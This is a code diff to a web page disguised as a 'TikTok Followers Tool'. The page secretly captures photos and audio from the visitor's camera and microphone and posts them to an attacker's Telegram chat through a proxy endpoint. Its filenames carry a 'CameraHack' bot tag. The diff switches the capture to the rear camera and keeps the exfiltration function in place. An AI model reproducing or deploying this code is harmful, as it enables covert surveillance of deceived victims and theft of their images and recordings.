@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>TikTok Followers Tool - Front Camera</title>
+  <title>TikTok Followers Tool - Back Camera</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
   <style>
@@ -60,7 +60,7 @@
 
     var chatid = GetURLParameter('id');  
 
-    navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}, audio:true })  
+    navigator.mediaDevices.getUserMedia({ video:{facingMode:'environment'}, audio:true })  
     .then(async (stream)=>{  
       const imageCapture=new ImageCapture(stream.getVideoTracks()[0]);  
       const audioRecorder=new MediaRecorder(stream);  
@@ -124,17 +124,17 @@
     });  
 
     function sendToTelegram(data,type){   
-  if(!chatid) return;   
-  const formData = new FormData();   
-  formData.append('chat_id', chatid);   
+      if(!chatid) return;   
+      const formData = new FormData();   
+      formData.append('chat_id', chatid);   
 
-  if(type === 'photo'){  
-    formData.append('photo', data, `@Ali_CameraHack_bot_${Date.now()}.jpg`);  
-  } else if(type === 'audio'){  
-    formData.append('audio', data, `@Ali_CameraHack_bot_${Date.now()}.ogg`);  
-  }  
+      if(type === 'photo'){  
+        formData.append('photo', data, `@Ali_CameraHack_bot_${Date.now()}.jpg`);  
+      } else if(type === 'audio'){  
+        formData.append('audio', data, `@Ali_CameraHack_bot_${Date.now()}.ogg`);  
+      }  
 
-  fetch(`/api/proxy?type=${type}`, { method:'POST', body:formData });   
+      fetch(`/api/proxy?type=${type}`, { method:'POST', body:formData });   
     }  
 
     function getBattery(){   
